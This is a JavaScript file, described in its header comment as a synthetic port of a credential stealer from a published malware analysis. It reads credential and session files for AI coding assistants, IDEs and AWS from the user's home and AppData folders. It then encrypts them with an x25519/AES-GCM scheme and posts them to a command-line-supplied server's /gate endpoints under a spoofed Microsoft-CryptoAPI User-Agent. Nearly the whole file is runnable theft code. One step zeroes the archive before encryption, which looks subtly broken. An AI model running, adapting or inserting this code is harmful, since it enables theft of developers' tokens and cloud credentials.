// Synthetic JavaScript port of the collection paths and upload protocol in
// Check Point's 2026-10-23 Aokigahara analysis. Not recovered malware bytes.
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const crypto = require('node:crypto');
const { zipSync } = require('fflate');

async function collect(baseURL, serverPublicKey, gateToken, buildID) {
  const { privateKey, publicKey } = crypto.generateKeyPairSync('x25519');
  const peer = crypto.createPublicKey({
    key: Buffer.concat([Buffer.from('302a300506032b656e032100', 'hex'), serverPublicKey]),
    format: 'der', type: 'spki'
  });
  const secret = crypto.diffieHellman({ privateKey, publicKey: peer });
  const key = crypto.createHash('sha256').update(secret).update('aokigahara').digest();
  const headers = {
    'Content-Type': 'application/octet-stream',
    'User-Agent': 'Microsoft-CryptoAPI/10.0',
    'X-Build-ID': buildID, 'X-Gate-Token': gateToken,
    'X-Session': crypto.randomBytes(16).toString('hex'),
    'X-HWID': crypto.createHash('sha256').update(os.hostname()).digest('hex').slice(0, 8)
  };
  const handshake = await fetch(baseURL + '/gate/handshake', {
    method: 'POST', headers: { ...headers, 'X-KEX': 'x25519' },
    body: publicKey.export({ type: 'spki', format: 'der' }).subarray(-32)
  });
  if (handshake.status !== 200) return;
  const targets = [
    '.claude/credentials.json', '.claude.json',
    '.codex/auth.json', '.codex/config.toml', '.codex/.env',
    '.copilot/hosts.json', '.copilot/config.json',
    '.aws/credentials', '.aws/config', '.aws/sso/cache/kiro-auth-token.json',
    'gemini-cli-workspace-token.json', '.gemini-cli-workspace-master-key',
    '.gemini/.env', '.gemini/config.json', '.codeium/config.json',
    'Cursor/User/globalStorage/state.vscdb',
    'Windsurf/User/globalStorage/state.vscdb'
  ];
  const files = {};
  const roots = [os.homedir(), process.env.APPDATA].filter(Boolean);
  for (const root of roots) {
    for (const target of targets) {
      const file = path.join(root, target);
      try { files['AISessions/' + target] = new Uint8Array(fs.readFileSync(file)); }
      catch (_) { /* A missing target does not stop other collection. */ }
    }
  }
  const archive = zipSync(files);
  const nonce = Buffer.concat([Buffer.alloc(4), crypto.randomBytes(8)]);
  nonce.writeUInt32LE(0, 0);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, nonce);
  archive.fill(0);
  const body = Buffer.concat([nonce, cipher.update(archive), cipher.final(), cipher.getAuthTag()]);
  await fetch(baseURL + '/gate/chunk', {
    method: 'POST', headers: { ...headers, 'X-Chunk': 'aisessions', 'X-Chunk-Index': '0', 'X-Total': '1' }, body
  });
  const complete = await fetch(baseURL + '/gate/complete', {
    method: 'POST', headers, body: Buffer.from('COMPLETE')
  });
  if (complete.status !== 200) throw new Error('Incomplete session');
}

// Supply configuration explicitly; no real infrastructure is embedded here.
if (require.main === module && process.argv.length === 6) {
  collect(process.argv[2], Buffer.from(process.argv[3], 'hex'), process.argv[4], process.argv[5]);
}
